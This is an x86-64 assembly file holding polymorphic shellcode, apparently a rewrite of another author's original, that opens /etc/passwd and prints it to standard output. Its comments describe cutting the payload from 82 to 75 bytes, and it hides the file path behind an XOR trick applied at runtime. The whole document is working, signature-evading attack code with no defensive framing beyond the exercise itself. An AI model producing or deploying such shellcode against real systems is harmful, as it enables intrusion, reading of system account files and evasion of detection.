BITS 64
; Polymorphic version of Mr. Un1k0d3rs /etc/passwd read shellcode
; Orig Size: 82 bytes
; Polymorphic size: 75 bytes
global _start

section .text

_start:
xor rax, rax
mov rsi, rax ; null out rsi
cdq ; null out rdx
inc al
inc al
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
xor byte [rdi + 11], 0x42
syscall
  
; syscall read file
xchg rdi, rax
mov rax, rdx
mov dx, 0xfff; size to read
sub sp, dx
push rsp
pop rsi ; rsi points to buffer on stack
syscall
  
; syscall write to stdout
mov rdx, rax
xor rdi, rdi
push rdi
pop rax
inc rdi
inc al
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/etc/passwdB"
